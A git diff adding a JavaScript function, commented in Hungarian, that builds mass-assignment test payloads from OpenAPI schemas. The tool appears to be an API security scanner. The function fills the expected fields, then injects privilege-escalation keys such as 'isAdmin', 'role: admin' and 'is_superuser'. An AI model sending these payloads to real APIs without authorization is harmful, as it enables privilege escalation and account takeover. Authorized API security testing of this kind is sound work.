@@ -167,3 +167,51 @@ export async function harvestResourceIds(targetUrl, openApiSpec, adminToken) {
 
     return harvestedData;
 }
+
+
+
+/**
+ * Dinamikus "mérgezett" payload generátor OpenAPI séma alapján.
+ * Megtartja az API által elvárt mezőket, de belekeveri a jogosultság-emelő kulcsokat.
+ */
+function generateDynamicMaliciousPayload(operation) {
+    // 1. Megpróbáljuk kinyerni az elvárt kéréstörzs sémáját a Swaggerből
+    const schema = operation.requestBody?.content?.['application/json']?.schema;
+    
+    const payload = {};
+
+    // 2. Ha van séma, kitöltjük az alapértelmezett típusoknak megfelelő dummy adatokkal
+    if (schema && schema.properties) {
+        for (const [key, prop] of Object.entries(schema.properties)) {
+            // Ha a kulcs történetesen már eleve egy érzékeny mező (pl. a séma megengedi), azt is tesztelhetjük
+            if (prop.type === 'string') payload[key] = "test_value";
+            else if (prop.type === 'number' || prop.type === 'integer') payload[key] = 1;
+            else if (prop.type === 'boolean') payload[key] = false;
+            else if (prop.type === 'array') payload[key] = [];
+            else payload[key] = "test";
+        }
+    } else {
+        // Fallback, ha nincs séma: küldünk egy általános üres objektumot vagy alap mezőt
+        payload.name = "BOPLA_Test";
+    }
+
+    // 3. BESZENNYEZÉS (Poisoning): Hozzáadjuk a jogosultság-emelő kulcsokat a szótárból,
+    // függetlenül attól, hogy a fejlesztő beleírta-e a Swaggerbe vagy sem.
+    // (A lényeg, hogy a backend elfogadja-e a nem dokumentált / tiltott mezőket is)
+    const injectionVectors = [
+        { key: 'isAdmin', value: true },
+        { key: 'is_admin', value: true },
+        { key: 'role', value: 'admin' },
+        { key: 'roles', value: ['admin', 'superuser'] },
+        { key: 'access_level', value: 99 },
+        { key: 'permission', value: 'all' },
+        { key: 'is_superuser', value: true }
+    ];
+
+    // Beleolvasztjuk a mérgező mezőket a payloadba
+    for (const vector of injectionVectors) {
+        payload[vector.key] = vector.value;
+    }
+
+    return payload;
+}
